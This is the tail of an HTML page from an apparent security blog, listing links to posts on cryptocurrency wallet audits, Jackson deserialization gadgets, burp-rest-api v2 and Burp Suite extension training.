    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2019/08/01/common-crypto-bugs.html">
            Lessons in auditing cryptocurrency wallets, systems, and infrastructures
            <small>01 Aug 2019</small>
          </a>
        </h3>
      </li>
       
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2019/07/22/jackson-gadgets.html">
            Jackson gadgets - Anatomy of a vulnerability
            <small>22 Jul 2019</small>
          </a>
        </h3>
      </li>
       
                           
    
    
    
                           
    
    
    
                           
    
    
    
    
       
                           
    
    
    
                           
    
    
    
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2018/11/05/burp-rest-api-v2.html">
            Introducing burp-rest-api v2
            <small>05 Nov 2018</small>
          </a>
        </h3>
      </li>
       
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2017/03/02/training-burp.html">
            Developing Burp Suite Extensions training
            <small>02 Mar 2017</small>
          </a>
        </h3>
      </li>
       
                           
    
  </ul>
</div>

    </div>

  <script src="/public/js/jquery.min.js"></script>
  <script src="/public/js/main.js"></script>
  </body>
</html>
